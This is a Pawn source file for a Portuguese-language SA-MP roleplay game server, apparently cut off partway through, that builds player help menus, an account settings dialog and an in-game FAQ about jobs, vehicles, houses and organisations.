#include <YSI_Coding\y_hooks>

//------------------------- Definitions and constants -------------------------
static ChatNoobStatus = true;
static talkChatNoob[MAX_PLAYERS];

//------------------------- Data (This section is for module-internal data. Make sure to make the accessor variable 'static') -------------------------

//------------------------- Timers (Timers used in the module.) -------------------------

//------------------------- Internal API (Functions to be used only inside of this module. Use 'static (stock)' and camelCase) -------------------------
static stock ShowHelpDialog(playerid)
{
    return ShowPlayerDialog(playerid, DIALOG_HELP_LIST, DIALOG_STYLE_LIST, "{FFFFFF}Ajuda do Servidor", "{1e90ff}Ajuda » {ffffff}FAQ (Dúvidas Frequentes)\n{1e90ff}Ajuda » {ffffff}Inventário\n{1e90ff}Ajuda » {ffffff}Veículos\n{1e90ff}Ajuda » {ffffff}Veículo Próprio\n{1e90ff}Ajuda » {ffffff}Comandos do Servidor\n{1e90ff}Ajuda » {ffffff}Comandos do SA-MP\n{1e90ff}Ajuda » {ffffff}Casa\n{1e90ff}Ajuda » {ffffff}Empresa\n{1e90ff}Ajuda » {ffffff}Líder\n{1e90ff}Ajuda » {ffffff}Sub-Líder\n{1e90ff}Ajuda » {ffffff}Emprego\n{1e90ff}Ajuda » {ffffff}Organização\n{1e90ff}Ajuda » {ffffff}Acessórios\n{1e90ff}Ajuda » {ffffff}Caixa Surpresa\n{1e90ff}Ajuda » {ffffff}Animações", "Escolher", "Cancelar");
}

static stock ShowPlayerConfig(playerid)
{
	new configDialog[872 + 1], string[74 + 1];
	strcat(configDialog, "{FFFFFF}Sistema\t{FFFFFF}Informações\n");
	strcat(configDialog, "{0080ff}• {FFFFFF}Gerenciar Tags\t{848484}Clique para Configurar\n");
	switch(Player_GetSpawn(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Spawn Padrão\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Casa\n");
		case 2: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}HQ Admin\n");
	}
	// Configurações de Chat
	strcat(configDialog, (Player_GetTerritorialChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens Territoriais\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens Territoriais\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetNoobChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetVipChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetSocioChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetMusicStreamStatus(playerid) ? "{0080ff}• {FFFFFF}Música de Interiores\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Música de Interiores\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetLeaderChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{f60000}Desabilitado\n"));
	// 
	switch(Player_GetDocument(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[FORMATO MENU]\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[TEXTO]\n");
	}
	switch(Player_GetSpeedometer(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Moderno\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Compacto\n");
	}
	switch(Player_GetTracker(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}CheckPoint\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}Seta\n");
	}
	if (!Player_GetUsingAndroidStatus(playerid))
	{
		strcat(configDialog, "{0080ff}• {FFFFFF}Plataforma\t{FFEC8B}PC\n");
	}
	else
	{
		strcat(configDialog, "{0080ff}• {FFFFFF}Plataforma\t{FFEC8B}Android\n");
	}
	switch(Player_GetScreenSize(playerid))
	{
		case SCREEN_INVALID: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}Inválido\n");
		case SCREEN_NORMAL: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}16:9\n");
		case SCREEN_ULTRAWIDE: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}21:9\n");
	}
	strcat(configDialog, "{0080ff}• {FFFFFF}Menu Hit(Sino do Dano)\t{848484}Clique para Configurar\n");
	format(string, sizeof(string), "{FFFFFF}Configurações da Conta: ({0080ff}%s{FFFFFF})", SERVER_TAG);
	return ShowPlayerDialog(playerid, DIALOG_CONFIG_LIST, DIALOG_STYLE_TABLIST_HEADERS, string, configDialog, "Selecionar", "Fechar");
}

//------------------------- External API (Functions accessible from other modules. Use 'stock' and PascalCase.) -------------------------
stock ShowPlayerFaqList(playerid)
{
    new faqList[1239 + 1];
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Sou um jogador novo no servidor, o que eu preciso fazer?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}O que é e porque o servidor é classificado como RPG?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}O que devo fazer após começar minha vida no servidor?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu localizo um local?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu consigo um emprego?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu entro em uma organização?\n");
    strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu adquiro habilitação de veículos e porte de armas?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu consigo armas no servidor?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Vim de outro servidor, posso ter meu progresso alterado?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Estou sofrendo algum tipo de abuso/bullying, o que devo fazer?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}O que é o sistema de VIP e como eu consigo ser um jogador vip?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Meu GTA está crashando do nada, o que pode ser?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu crio uma conta no fórum e por que preciso dela\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Vi alguém quebrando as regras do servidor, como devo proceder?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Como eu passo de nível?\n");
	strcat(faqList, "{ff6347}Pergunta » {FFFFFF}Eu posso mudar meu nome e/ou minha senha?\n");
    return ShowPlayerDialog(playerid, DIALOG_FAQ_LIST, DIALOG_STYLE_LIST, "{FFFFFF}Perguntas Frequentes", faqList, "Ver", "Cancelar");
}

//------------------------- Implementation (This section contains the concrete implementation for this module inside of the callbacks) -------------------------
hook OnPlayerPressF(playerid)
{
	if (IsPlayerInRangeOfPoint(playerid, 2.0, 809.5279, -1341.4880, 13.5405))
	{
		ShowPlayerFaqList(playerid);
		return 1;
	}
	return 1;
}

hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	#pragma unused inputtext // need this directive, on account of YSI which shows warnings in case the parameter is not used.

    switch (dialogid)
    {
		case DIALOG_FAQ_LIST:
		{
		    if (!response)
			{
				return 1;
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Sou um jogador novo no SA-MP, o que eu preciso fazer?\n\n{f04b87}Resposta:\n{FFFFFF}Primeiramente, seja muito bem vindo!\nNosso servidor é estilo RPG e busca simular a vida real, por isso a primeira coisa que você deve fazer é \nir conseguir um emprego na prefeitura e a partir dai começar a explorar e se divertir em nosso servidor.\n\n{ff6347}OBS: {FFFFFF}Após um tempo é necessário que você consiga suas habilitações para conseguir usar os\nveículos e armas do servidor.", "Voltar", "Fechar");
					}
					case 1:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}O que é e porque o servidor é classificado como RPG?\n\n{f04b87}Resposta:\n{FFFFFF}O estilo RPG do nosso servidor é voltado em simular os amplos aspectos da vida real,\nna qual você precisa ter um emprego, conseguir uma casa, um veículo, ou seja você\nirá buscar ter uma segunda vida em nosso servidor.\n\n{ff6347}OBS: {FFFFFF}Em razão de um jogo não poder simular 100% da vida real, há regras a serem\nseguidas no servidor, que foram feitas visando a manter a pacificidade a jogabilidade\nde todos no servidor. Essas regras são constantemente atualizadas para se adaptarem\na comunidade do servidor.", "Voltar", "Fechar");

					}
					case 2:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}O que devo fazer após começar minha vida no servidor?\n\n{f04b87}Resposta:\n{FFFFFF}Para essa pergunta não existe uma resposta correta. O jogador, assim como na vida real\n é livre para seguir o seu modo de jogo como ele quiser (desde que cumpra as regras do\nservidor). Por isso você pode ficar em um emprego, entrar em uma organização, ou \nsimplesmente viver por aí conhecendo novas pessoas.", "Voltar", "Fechar");
					}
					case 3:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu localizo um local?\n\n{f04b87}Resposta:\n{FFFFFF}Para localizar um local você pode utilizar o comando: /gps.\nEsse comando listará todos os principais locais do servidor e ao \nescolher o local, uma marca vermelha aparecerá no seu mini-mapa.\n\n{ff6347}OBS: {FFFFFF}Caso não encontre o que deseja no gps, você pode entrar em\ncontato com algum administrador usando o comando: /relatorio.", "Voltar", "Fechar");
					}
					case 4:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu consigo um emprego?\n\n{f04b87}Resposta:\n{FFFFFF}O emprego é o estágio inicial para qualquer jogador é nele onde o jogador irá ter o primeiro\ncontato com o servidor e onde irá aprender a jogar.\nPara conseguir um emprego você deve ir até a prefeitura (você pode localizá-la usando o gps)\ne lá irá ter o menu de empregos no qual você pode escolher um dentre as várias opções que\nnosso servidor disponibiliza.", "Voltar", "Fechar");
					}
					case 5:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu entro em uma organização?\n\n{f04b87}Resposta:\n{FFFFFF}As organizações são como os empregos, porém elas são mais complexas e são\ngerenciadas por um jogador, chamado de líder, o qual é escolhido por nossa\nadministração.\nPara conseguir entrar em uma organização é necessário entrar em contato\ncom o líder da organização e cumprir os requisitos exigidos por ele.\n\n{ff6347}OBS: {FFFFFF}Cada organização pode ter exigências diferentes, pois elas são definidas\npelo líder.", "Voltar", "Fechar");
					}
					case 6:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu adquiro habilitação de veículos e porte de armas?\n\n{f04b87}Resposta:\n{FFFFFF}Para adquirir suas habilitações para veículos você deve ir até\na autoescola (você pode localizá-la no gps). Lá você encontrará\nos o menu com as diversas categorias para as quais você pode\nrealizar o teste prático.\nJá para adquirir o porte de armas, é necessário que você vá até\na prefeitura, é lá onde você irá solicitar o porte de armas.", "Voltar", "Fechar");
					}
					case 7:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu consigo armas no servidor?\n\n{f04b87}Resposta:\n{FFFFFF}Existem diversas formas de conseguir armas no servidor, você\npode comprar armas nas lojas de armas espalhadas pelo mapa.\nOu caso, você faça parte de uma organização você pode se equipar\nno menu que se encontra na HQ da sua organização.\nJá para jogadores Vips e Sócios, eles possuem o comando: \equipar ,\no qual permite que esses jogadores consigam armas em qualquer lugar\nque eles estejam.", "Voltar", "Fechar");
					}
					case 8:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Vim de outro servidor, posso ter meu progresso alterado?\n\n{f04b87}Resposta:\n{FFFFFF}Sim. É possível trazer o progresso que você tinha em outro servidor\n para o nosso. Para isso você deve solicitar a edição da sua conta\nno nosso fórum e aguardar até que um administrador inicie esse\nprocesso.", "Voltar", "Fechar");
					}
					case 9:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Estou sofrendo algum tipo de abuso/bullying, o que devo fazer?\n\n{f04b87}Resposta:\n{FFFFFF}Nós não toleramos nenhum tipo de abuso, preconceito, discriminação\nou difamação no nosso servidor. Isso é um caso grave de abuso de nossas\nregras.\nCaso você esteja sofrendo com algo similar, por favor entre em contato com\num administrador (no jogo ou no fórum) o mais rápido possível, que nós\niremos tomar todas as medidas cabíveis.", "Voltar", "Fechar");
					}
					case 10:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}O que é o sistema de VIP e como eu consigo ser um jogador vip?\n\n{f04b87}Resposta:\n{FFFFFF}Nosso servidor foi construído com o intuito de não ser pay-to-win. Entretanto\nhá diversos custos para manter o servidor online e proporcionando diversão\npara todos os jogadores.\nPor isso criamos um sistema de Vip e Sócio, os quais liberam alguns recursos\npara os jogadores que realizam doações para o servidor. Esses recursos não\ndevem impactar diretamente sobre a vantagem de um jogador sobre o outro,\nmas deve facilitar algumas coisas para a gameplay dos jogadores vip e sócios\nbem como garantir alguns benefícios exclusivos.", "Voltar", "Fechar");
					}
					case 11:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Meu Gta está crashando do nada, o que pode ser?\n\n{f04b87}Resposta:\n{FFFFFF}Não existe uma resposta universal para essa pergunta. Diversos fatores\npodem fazer seu gta crashar ou travar.\nUm dos principais fatores que provocam isso são os mods, evite colocar\nmodificações muito pesadas em seu gta e matenha sempre seus drivers\natualizados.\n\n{ff6347}OBS: {FFFFFF}Existem casos onde esses travamentos e crashs podem ocorrer em razão\nde algum sistema ou bug de servidor, porém nossa equipe está sempre\nfazendo testes e otimizando o servidor para que não ocorra esse tipo de \nproblema. Caso você ache que seja um problema do servidor, por favor entre em\ncontato com algum administrador (no jogo ou no fórum).", "Voltar", "Fechar");
					}
					case 12:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu crio uma conta no fórum e por que preciso dela\n\n{f04b87}Resposta:\n{FFFFFF}Uma conta em nosso fórum é essencial, pois é por lá que todas as atualizações\nsobre regras, sistemas, administração, denúncias e diversos outros tópicos são\nfeitas. É necessário que os jogadores possuam uma conta no fórum, pois é nele\nonde você irá interagir com a comunidade fora do jogo.\n\n{ff6347}OBS: {FFFFFF}Jogadores que não criem conta no fórum, correm o risco de terem suas\ncontas no servidor deletada.", "Voltar", "Fechar");
					}
					case 13:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Vi alguém quebrando as regras do servidor, como devo proceder?\n\n{f04b87}Resposta:\n{FFFFFF}Em caso de alguém quebrar as regras, fazer atos anti RPG, ou quaisquer\noutras transgressões você deve imediatamente entrar em contato com\num administrador, ou realizar uma denúncia formal no nosso fórum.", "Voltar", "Fechar");
					}
					case 14:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Como eu passo de nível?\n\n{f04b87}Resposta:\n{FFFFFF}Para passar de nível é necessário que você possua\n a experiência e dinheiro necessário para avançar para\no próximo nível.\nCaso você cumpra esses requisitos basta utilizar o\ncomando: /passarnivel.", "Voltar", "Fechar");
					}
					case 15:
					{
					    ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Perguntas Frequentes", "{ff6347}Pergunta:\n{FFFFFF}Eu posso mudar meu nome e/ou minha senha?\n\n{f04b87}Resposta:\n{FFFFFF}É possível realizar a troca de nome e senha no servidor.\nA troca de é um recurso que deve ser comprado com\ndinheiro real, ao adquirir moedas vip no jogo, processo\npode ser realizado no próprio jogo.\nJá para a troca de senha é necessário que você crie uma\nsolicitação em nosso fórum e aguarde até que um administrador\nentre em contato com você.", "Voltar", "Fechar");
					}
				}
				return 1;
			}
		}
		case DIALOG_FAQ_ITEM:
		{
		    if (!response)
			{
				return 1;
			}
			if (response)
			{
			    return ShowPlayerFaqList(playerid);
			}
		}
        case DIALOG_HELP_LIST:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Você fechou a ajuda.");
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
	     				return ShowPlayerFaqList(playerid);
					}
		            case 1:
					{
					    new helpMessage[392];
					    strcat(helpMessage, "{0080ff}Opções:\n");
						strcat(helpMessage, "{FFFFFF}USAR: {848484}Usa o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}VENDER: {848484}Vende o item selecionado para outro jogador.\n");
	                    strcat(helpMessage, "{FFFFFF}DESTRUIR: {848484}Destrói permanentemente o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}ANUNCIAR: {848484}Anuncia a venda do item selecionado.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para abrir seu inventário digite: {0080ff}(/inventario) {FFFFFF}ou pressione {0080ff}(Y).{FFFFFF}\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Inventário", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 2:
					{
					    new helpMessage[327];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/motor: {848484}Liga/Desliga o motor do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/farol: {848484}Liga/Desliga o farol do veículo.\n");
	                    strcat(helpMessage, "{FFFFFF}/mala: {848484}Abre/Fecha o porta-malas do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/camera: {848484}Ativa/Desativa a câmera em primeira pessoa.\n");
						strcat(helpMessage, "{FFFFFF}/flash: {848484}Ativa/Desativa o flash do veículo.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Veículos", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 3:
					{
						return ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos de Veículo Próprio", "{FFFFFF}Comandos de Veículos Próprios:\n\n-> {2e9afe}/meusveiculos - Gerencia todos os seus veículos próprios\n\n{ff6347}Informações:\n\n{0b610b}Sair do jogo: {585858}Toda vez que você sair do jogo, seu veículo sairá junto, e será carregado novamente\nonde estacionou, caso tenha comprado e não estacionado, ele ficará na última posição onde ficou pela última vez.\nAo você spawnar no menu do veículo, a mesma coisa vale para quando o veículo explodir\nserá necessário spawnar ele novamente.\n\n{0b610b}Limite de Veículo: {585858}Jogadores Free poderão ter no máximo 1 veículo próprio, jogadores Vip poderão\npossuir até 5 veículos próprio (dependendo do tipo de Vip). OBS: Caso tenha comprado 5 veículos sendo Vip e\nos dias de VIP acabarem, não precisará se preocupar pois ele ficará para sempre.\n\n{0b610b}Revenda: {585858}Ao revender seu veículo na Revendedora, receberá o valor 3x menor do preço original.", "Fechar", "");
					}
					case 4:
					{
						new helpMessage[1770];
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Nem todos os comandos estão listados, portanto, caso tenha dúvidas utilize o chat {0080ff}/n{FFFFFF}.\n\n");
					    strcat(helpMessage, "{FFFFFF}• {0080ff}Lista de comandos e suas respectivas funções:\n");
						strcat(helpMessage, "{FFFFFF}/ajuda: {848484}Obtém informações sobre os sistemas do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/rg: {848484}Visualiza a sua identidade.\n");
	                    strcat(helpMessage, "{FFFFFF}/configuracoes: {848484}Abre as personalizações de modo de jogo.\n");
						strcat(helpMessage, "{FFFFFF}/regras: {848484}Mostra as regras do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/sites: {848484}Mostra as mídias sociais do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/relatorio(/relato): {848484}Solicita um atendimento com um administrador.\n");
						strcat(helpMessage, "{FFFFFF}/anunciar(/an): {848484}Anuncia algo para todos os jogadores.\n");
						strcat(helpMessage, "{FFFFFF}/eu: {848484}Simula uma ação no chat.\n");
						strcat(helpMessage, "{FFFFFF}/pagar: {848484}Dar dinheiro de sua mão para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/gps: {848484}Localizar um local do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/livrar: {848484}Joga fora itens ilegais.\n");
						strcat(helpMessage, "{FFFFFF}/ejetar: {848484}Expulsa um jogador do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/solicitar: {848484}Solicita por um serviço.\n");
						strcat(helpMessage, "{FFFFFF}/titulos: {848484}Mostra os títulos disponíveis para uso.\n");
						strcat(helpMessage, "{FFFFFF}/mostrarrg: {848484}Mostra sua identidade para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/procurar: {848484}Procura por um jogador no mapa.\n");
						strcat(helpMessage, "{FFFFFF}/localizar: {848484}Localiza locais importantes do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/minhaslicencas: {848484}Mostra suas habilitações.\n");
						strcat(helpMessage, "{FFFFFF}/habilidades: {848484}Mostra suas habilidades profissionais.\n");
						strcat(helpMessage, "{FFFFFF}/animes: {848484}Mostra os animes do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/inventario: {848484}Abre o inventário do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/dormir: {848484}Ativa o modo dormir.\n");
						strcat(helpMessage, "{FFFFFF}/rank: {848484}Vê o rank de jogadores do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/meusveiculos: {848484}Acessa o menu de veículos próprios do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Acessa o menu de acessórios equipados do jogador.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_CMDS1, DIALOG_STYLE_MSGBOX, "{FFFFFF}Listagem de Comandos: {0080ff}1", helpMessage, "Próximo", "Voltar");
						return 1;
					}
					case 5:
					{
						new helpMessage[1999];
						strcat(helpMessage, "{0080ff}/quit (ou /q): {FFFFFF}Fecha o GTA.\n\n");
						strcat(helpMessage, "{0080ff}/fpslimit: {FFFFFF}Este comando define o limite de FPS (quadros por segundo) para o seu jogo.\nQuanto maior o limite, mais suave é o seu jogo. Não tem efeito se o limitador de quadro\nestiver desativado nas opções gráficas. O limite pode ser definido entre 20 e 90.\n\n");
						strcat(helpMessage, "{0080ff}/pagesize: {FFFFFF}É usado para escolher a quantidade de linhas do chat a serem exibidas.\nPode ser de 10 a 20 linhas. O tamanho da página é 10 por padrão.\n\n");
						strcat(helpMessage, "{0080ff}/headmove: {FFFFFF}Este comando irá ativar/desativar os movimentos da cabeça dos personagens.\n\n");
						strcat(helpMessage, "{0080ff}/timestamp: {FFFFFF}Este comando mostrará/ocultará a hora ao lado de todas as mensagens\ndo chat (A hora exibida é a do seu computador, não a do servidor).\n\n");
						strcat(helpMessage, "{0080ff}/dl: {FFFFFF}Este comando ativa/desativa um rótulo em todos os veículos (apenas para você)\nexibindo a identificação do ID do veículo, modelo, lataria e etc.\n\n");
						strcat(helpMessage, "{0080ff}/audiomsg: {FFFFFF}Ativa/Desativa a mensagem que é exibida no chat quando uma URL é transmitida\npara você. Exemplo: Quando um jogador colocar som próximo a você, não vai aparecder o\nLINK da música, apenas irá reproduzir o áudio da URL.\n\n");
						strcat(helpMessage, "{0080ff}/fontsize: {FFFFFF}Altera o tamanho da fonte da interface do usuário (bate-papo, diálogos[menu] e etc).\nO tamanho de letra válido é de -3 a 5.\n\n");
						strcat(helpMessage, "{0080ff}/meustatus: {FFFFFF}Comando para exibir um menu com informações de sua CONEXÃO.\n\n\n");
						strcat(helpMessage, "{848484}Teclas de Atalho:.\n");
						strcat(helpMessage, "{FFFFFF}[TAB] - {848484}Exibe informações dos jogadores conectados, como: level, ping e etc.\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Exibe as estatísticas de largura de banda (Conexão).\n");
						strcat(helpMessage, "{FFFFFF}[F7] - {848484}Altera o CHAT do Servidor (Oculta ou diminui o brilho).\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Tira um a print(Screenshot) da tela. (Pasta: GTA San Andreas User Files).\n");
						strcat(helpMessage, "{FFFFFF}[F9] - {848484}Oculta/Mostra o chatkill.\n");
						strcat(helpMessage, "{FFFFFF}[T] - {848484}Abre o chat do servidor para inserior comandos ou mensagens.\n");
						strcat(helpMessage, "{FFFFFF}[G] - {848484}Entra em um veículo como passageiro.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos do: {0080ff}SA-MP", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 6:
					{
						/*if (playerInfo[playerid][pHouseKey] == UNDEFINED_HOUSE)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa.");
						}*/
						new helpMessage[246];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chave: {848484}Tranca/Destranca a casa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarcasa: {848484}Vende a casa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/vendercasa: {848484}Vende a casa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menucasa: {848484}Acessa as opções da casa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Casa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 7:
					{
						/*if (playerInfo[playerid][pCompanyKey] == UNDEFINED_BIZZ)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma empresa.");
						}*/
						new helpMessage[268];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chaveb: {848484}Tranca/Destranca a empresa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarempresa: {848484}Vende a empresa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/venderempresa: {848484}Vende a empresa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menuempresa: {848484}Acessa as opções da empresa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Empresa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 8:
					{
					    if (Player_GetOrgRole(playerid) != 6)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
						}
						//
						new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
